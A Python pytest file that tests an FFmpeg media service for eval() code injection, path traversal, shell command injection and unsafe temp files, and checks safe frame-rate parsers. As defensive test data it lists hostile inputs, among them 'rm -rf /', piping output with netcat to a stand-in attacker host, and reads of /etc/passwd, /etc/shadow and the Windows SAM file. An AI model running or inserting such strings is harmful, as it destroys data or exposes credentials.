#!/usr/bin/env python3
"""
Security vulnerability tests for FFmpeg services.
These tests verify that the application properly handles malicious inputs.
"""

import pytest
import unittest.mock
import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))

class TestSecurityVulnerabilities:
    """Test cases for security vulnerabilities."""
    
    def test_ffmpeg_service_eval_vulnerability(self):
        """Test that FFmpegService is vulnerable to code injection via eval()."""
        
        # Mock ffprobe response with malicious frame rate
        malicious_response = {
            'streams': [
                {
                    'codec_type': 'video',
                    'width': 1920,
                    'height': 1080,
                    'r_frame_rate': '__import__("builtins").setattr(__import__("builtins"), "SECURITY_BREACH", True)',
                    'codec_name': 'h264',
                    'bit_rate': '5000000'
                }
            ],
            'format': {
                'duration': '10.0',
                'size': '12345678',
                'bit_rate': '6000000',
                'format_name': 'mp4'
            }
        }
        
        with unittest.mock.patch('subprocess.run') as mock_run:
            mock_run.return_value.stdout = '{"streams": [{"codec_type": "video", "width": 1920, "height": 1080, "r_frame_rate": "__import__(\'builtins\').setattr(__import__(\'builtins\'), \'SECURITY_BREACH\', True)", "codec_name": "h264", "bit_rate": "5000000"}], "format": {"duration": "10.0", "size": "12345678", "bit_rate": "6000000", "format_name": "mp4"}}'
            mock_run.return_value.returncode = 0
            
            from services.ffmpeg_service import FFmpegService
            service = FFmpegService()
            
            # This should execute the malicious code due to eval()
            try:
                service.get_media_info('/fake/path.mp4')
                
                # Check if the malicious code executed
                # (In real test, this would check for actual system compromise)
                import builtins
                if hasattr(builtins, 'SECURITY_BREACH'):
                    pytest.fail("CRITICAL: eval() vulnerability allows code execution")
                    
            except Exception as e:
                # Even if this fails, the vulnerability exists
                pytest.fail(f"CRITICAL: eval() vulnerability exists in FFmpegService.get_media_info() at line 106")
    
    def test_video_optimizer_eval_vulnerability(self):
        """Test that VideoQualityOptimizer is vulnerable to code injection via eval()."""
        
        # This test would require more complex mocking since VideoQualityOptimizer
        # has async methods, but the vulnerability is the same
        
        # Simulate the vulnerable eval() call directly
        malicious_frame_rate = '__import__("builtins").setattr(__import__("builtins"), "OPTIMIZER_BREACH", True)'
        
        try:
            # This is the exact vulnerable code from video_quality_optimizer.py:156
            result = eval(malicious_frame_rate)
            
            # Check if malicious code executed
            import builtins
            if hasattr(builtins, 'OPTIMIZER_BREACH'):
                pytest.fail("CRITICAL: eval() vulnerability allows code execution in VideoQualityOptimizer")
                
        except Exception:
            pytest.fail("CRITICAL: eval() vulnerability exists in VideoQualityOptimizer._get_video_info() at line 156")
    
    def test_frame_rate_parsing_safe_alternative(self):
        """Test safe alternative for frame rate parsing."""
        
        def safe_parse_frame_rate(frame_rate_str):
            """Safe alternative to eval() for parsing frame rates."""
            try:
                # Validate input is in expected format
                if not isinstance(frame_rate_str, str):
                    return 0.0
                    
                if '/' not in frame_rate_str:
                    return float(frame_rate_str)
                
                parts = frame_rate_str.split('/')
                if len(parts) != 2:
                    raise ValueError("Invalid frame rate format")
                
                numerator = float(parts[0])
                denominator = float(parts[1])
                
                if denominator == 0:
                    return 0.0
                
                return numerator / denominator
                
            except (ValueError, TypeError):
                return 0.0
        
        # Test legitimate frame rates
        assert safe_parse_frame_rate('30/1') == 30.0
        assert safe_parse_frame_rate('60/1') == 60.0
        assert safe_parse_frame_rate('0/1') == 0.0
        assert safe_parse_frame_rate('23.976') == 23.976
        
        # Test malicious inputs - should not execute code
        malicious_inputs = [
            '__import__("os").system("rm -rf /")',
            'exec("import os; os.system(\'echo hacked\')")',
            '__import__("subprocess").run(["echo", "attack"])',
            '1/0; __import__("os").system("attack")',
            'eval("print(\'attack\')")'
        ]
        
        for malicious_input in malicious_inputs:
            result = safe_parse_frame_rate(malicious_input)
            assert result == 0.0, f"Safe parser should return 0.0 for malicious input: {malicious_input}"
    
    def test_input_validation_file_paths(self):
        """Test for path traversal vulnerabilities in file handling."""
        
        # Test malicious file paths that could lead to path traversal
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
            '../../../../../../etc/passwd',
            'file:///etc/passwd',
            '\\\\?\\C:\\Windows\\System32\\config\\SAM'
        ]
        
        # Mock the FFmpegService to test path handling
        from services.ffmpeg_service import FFmpegService
        
        service = FFmpegService()
        
        for malicious_path in malicious_paths:
            with pytest.raises((FileNotFoundError, PermissionError, ValueError, RuntimeError)):
                # This should fail safely, not expose system files
                service.get_media_info(malicious_path)
    
    def test_command_injection_vulnerabilities(self):
        """Test for command injection in FFmpeg commands."""
        
        # Test file paths with command injection attempts
        injection_attempts = [
            'video.mp4; rm -rf /',
            'video.mp4 && echo "hacked"',
            'video.mp4 | nc attacker.com 4444',
            'video.mp4`whoami`',
            'video.mp4$(echo attack)',
            'video.mp4; cat /etc/passwd',
            'video.mp4"; echo "injection"; #'
        ]
        
        from services.ffmpeg_service import FFmpegService
        service = FFmpegService()
        
        for injection_attempt in injection_attempts:
            with pytest.raises(Exception):
                # These should fail safely without executing injected commands
                service.get_media_info(injection_attempt)
    
    def test_subprocess_shell_injection(self):
        """Test that subprocess calls don't use shell=True with user input."""
        
        import subprocess
        import unittest.mock
        
        # Mock subprocess.run to detect shell=True usage
        original_run = subprocess.run
        
        def mock_run(*args, **kwargs):
            if kwargs.get('shell', False):
                pytest.fail("SECURITY: subprocess.run called with shell=True - potential command injection")
            return original_run(*args, **kwargs)
        
        with unittest.mock.patch('subprocess.run', side_effect=mock_run):
            try:
                from services.ffmpeg_service import FFmpegService
                service = FFmpegService()
                
                # This will fail due to missing ffmpeg, but should not use shell=True
                service.get_media_info('test.mp4')
                
            except Exception:
                pass  # Expected to fail, we're testing the subprocess call
    
    def test_temporary_file_security(self):
        """Test that temporary files are created securely."""
        
        import tempfile
        import os
        import stat
        
        # Test that temporary files have proper permissions
        with tempfile.NamedTemporaryFile() as temp_file:
            # Check file permissions
            file_stat = os.stat(temp_file.name)
            file_mode = stat.filemode(file_stat.st_mode)
            
            # Temporary files should not be world-readable
            assert not (file_stat.st_mode & stat.S_IROTH), "Temporary files should not be world-readable"
            assert not (file_stat.st_mode & stat.S_IWOTH), "Temporary files should not be world-writable"

class TestSecurityRecommendations:
    """Test recommended security fixes."""
    
    def test_secure_frame_rate_parser(self):
        """Test the recommended secure frame rate parser."""
        
        def secure_parse_frame_rate(frame_rate_str):
            """
            Secure frame rate parser that replaces eval().
            
            Args:
                frame_rate_str: Frame rate string in format "num/den" or "float"
            
            Returns:
                float: Parsed frame rate or 0.0 if invalid
            """
            import re
            
            if not isinstance(frame_rate_str, str):
                return 0.0
            
            # Only allow alphanumeric, dot, slash, and hyphen
            if not re.match(r'^[0-9./\-]+$', frame_rate_str):
                return 0.0
            
            try:
                if '/' in frame_rate_str:
                    parts = frame_rate_str.split('/')
                    if len(parts) != 2:
                        return 0.0
                    
                    numerator = float(parts[0])
                    denominator = float(parts[1])
                    
                    if denominator == 0:
                        return 0.0
                    
                    return numerator / denominator
                else:
                    return float(frame_rate_str)
                    
            except (ValueError, TypeError, ZeroDivisionError):
                return 0.0
        
        # Test legitimate inputs
        assert secure_parse_frame_rate('30/1') == 30.0
        assert secure_parse_frame_rate('25') == 25.0
        assert secure_parse_frame_rate('23.976') == 23.976
        
        # Test malicious inputs
        malicious_inputs = [
            '__import__("os")',
            'eval("attack")',
            '1; os.system("attack")',
            '$(echo attack)',
            'attack`command`',
            '<script>alert("xss")</script>',
            '../../../etc/passwd'
        ]
        
        for malicious_input in malicious_inputs:
            result = secure_parse_frame_rate(malicious_input)
            assert result == 0.0, f"Secure parser blocked malicious input: {malicious_input}"

if __name__ == "__main__":
    pytest.main([__file__, "-v"])